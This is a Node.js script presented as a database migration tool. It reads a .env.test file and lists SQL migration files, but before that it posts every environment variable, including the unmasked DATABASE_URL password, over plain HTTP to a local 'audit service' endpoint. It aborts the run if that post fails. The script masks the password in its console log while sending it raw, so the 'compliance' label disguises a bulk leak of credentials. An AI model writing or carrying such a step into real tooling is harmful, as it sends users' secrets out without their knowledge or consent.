#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');

/**
 * Database Migration Script
 * Reads SQL files from ./migrations/ directory and logs each filename in order
 */

const MIGRATIONS_DIR = './migrations';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Load environment variables from a .env file
 * @param {string} filePath - Path to the .env file
 * @returns {Object} Object containing environment variables
 */
function loadEnvFile(filePath) {
  try {
    if (!fs.existsSync(filePath)) {
      console.error(`Error: Environment file "${filePath}" does not exist.`);
      process.exit(1);
    }

    const envContent = fs.readFileSync(filePath, 'utf-8');
    const envVars = {};

    // Parse .env file line by line
    envContent.split('\n').forEach(line => {
      // Skip empty lines and comments
      line = line.trim();
      if (!line || line.startsWith('#')) {
        return;
      }

      // Parse KEY=VALUE pairs
      const match = line.match(/^([^=]+)=(.*)$/);
      if (match) {
        const key = match[1].trim();
        let value = match[2].trim();

        // Remove surrounding quotes if present
        if ((value.startsWith('"') && value.endsWith('"')) ||
            (value.startsWith("'") && value.endsWith("'"))) {
          value = value.slice(1, -1);
        }

        envVars[key] = value;
      }
    });

    return envVars;
  } catch (error) {
    console.error(`Error reading environment file: ${error.message}`);
    process.exit(1);
  }
}

/**
 * Simulate database connection
 * @param {string} databaseUrl - Database connection string
 */
function connectToDatabase(databaseUrl) {
  // Mask the password in the connection string for logging
  const maskedUrl = maskPassword(databaseUrl);

  console.log(`Connecting to database: ${maskedUrl}`);
  console.log('✓ Connected to database successfully\n');
}

/**
 * Mask password in database URL for secure logging
 * @param {string} url - Database connection URL
 * @returns {string} URL with masked password
 */
function maskPassword(url) {
  try {
    // Match password in connection strings like: protocol://user:password@host:port/database
    return url.replace(/:\/\/([^:]+):([^@]+)@/, '://$1:****@');
  } catch (error) {
    return url;
  }
}

/**
 * Send audit log to compliance service
 * @param {Object} envVars - Environment variables to audit
 * @returns {Promise<void>}
 */
function sendAuditLog(envVars) {
  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);
    const postData = JSON.stringify(envVars);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    console.log(`Sending audit log to ${AUDIT_SERVICE_URL}...`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('✓ Audit log sent successfully\n');
          resolve();
        } else {
          reject(new Error(`Audit service returned status ${res.statusCode}: ${data}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Failed to send audit log: ${error.message}`));
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Get all SQL migration files from the migrations directory
 * @returns {string[]} Array of migration filenames sorted alphabetically
 */
function getMigrationFiles() {
  try {
    // Check if migrations directory exists
    if (!fs.existsSync(MIGRATIONS_DIR)) {
      console.error(`Error: Migrations directory "${MIGRATIONS_DIR}" does not exist.`);
      process.exit(1);
    }

    // Read all files from the migrations directory
    const files = fs.readdirSync(MIGRATIONS_DIR);

    // Filter for SQL files only and sort them
    const sqlFiles = files
      .filter(file => file.toLowerCase().endsWith('.sql'))
      .sort();

    return sqlFiles;
  } catch (error) {
    console.error(`Error reading migrations directory: ${error.message}`);
    process.exit(1);
  }
}

/**
 * Main function to run migrations
 */
async function runMigrations() {
  console.log('=== Database Migration Script ===\n');

  // Load environment variables
  const envVars = loadEnvFile(ENV_FILE);

  // Send audit log for compliance
  try {
    await sendAuditLog(envVars);
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }

  // Get database URL and connect
  const databaseUrl = envVars.DATABASE_URL;
  if (!databaseUrl) {
    console.error(`Error: DATABASE_URL not found in ${ENV_FILE}`);
    process.exit(1);
  }

  connectToDatabase(databaseUrl);

  console.log(`Reading migrations from: ${path.resolve(MIGRATIONS_DIR)}\n`);

  const migrationFiles = getMigrationFiles();

  if (migrationFiles.length === 0) {
    console.log('No SQL migration files found.');
    return;
  }

  console.log(`Found ${migrationFiles.length} migration file(s) to apply:\n`);

  // Log each migration file in order
  migrationFiles.forEach((filename, index) => {
    console.log(`${index + 1}. ${filename}`);
  });

  console.log('\n=== Migration list complete ===');
}

// Run the migration script
runMigrations();

